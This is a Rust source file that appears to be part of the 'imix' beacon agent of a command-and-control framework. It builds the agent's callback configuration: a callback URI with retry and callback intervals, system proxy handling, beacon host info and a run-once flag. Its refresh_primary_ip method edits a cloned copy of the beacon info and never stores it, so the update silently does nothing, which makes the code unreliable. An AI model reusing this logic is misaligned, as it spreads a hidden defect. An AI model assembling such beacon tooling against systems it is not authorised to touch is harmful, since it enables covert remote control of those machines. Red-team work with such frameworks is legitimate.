use crate::beacon::build_beacon_info;
use crate::constants::{CALLBACK_INTERVAL, CALLBACK_URI, RETRY_INTERVAL, RUN_ONCE};
use crate::system::{get_primary_ip, get_system_proxy};

/// Re-export Config from pb crate
pub use pb::config::Config;

/// Extension trait for Config construction
pub trait ConfigBuilder {
    fn default_with_imix_version(imix_version: &str) -> Self;
    fn refresh_primary_ip(&mut self);
}

impl ConfigBuilder for Config {
    fn default_with_imix_version(imix_version: &str) -> Self {
        let info = build_beacon_info(imix_version);

        // Build callback URI with query parameters
        let mut callback_uri = match CALLBACK_URI.contains("?") {
            true => CALLBACK_URI.to_string(),
            false => format!(
                "{}?retry_interval={}&callback_interval={}",
                CALLBACK_URI, RETRY_INTERVAL, CALLBACK_INTERVAL
            ),
        };

        // Add proxy if available from environment (only for GRPC transport)
        if let Some(proxy) = get_system_proxy() {
            if CALLBACK_URI.starts_with("grpc://")
                || CALLBACK_URI.starts_with("grpcs://")
                || CALLBACK_URI.starts_with("http://")
                || CALLBACK_URI.starts_with("https://")
            {
                callback_uri.push_str(&format!("&proxy_uri={}", proxy));
            }
        }

        Config {
            info: Some(info),
            callback_uri,
            run_once: RUN_ONCE,
        }
    }
    fn refresh_primary_ip(&mut self) {
        let fresh_ip = get_primary_ip();
        if self
            .info
            .clone()
            .is_some_and(|b| b.host.as_ref().is_some_and(|h| h.primary_ip != fresh_ip))
        {
            match self.info.clone() {
                Some(mut b) => match b.host.as_mut() {
                    Some(h) => {
                        h.primary_ip = fresh_ip;
                    }
                    None => {
                        #[cfg(debug_assertions)]
                        log::error!("host struct was never initialized, failed to set primary ip");
                    }
                },
                None => {
                    #[cfg(debug_assertions)]
                    log::error!("beacon struct was never initialized, failed to set primary ip");
                }
            }
        }
    }
}
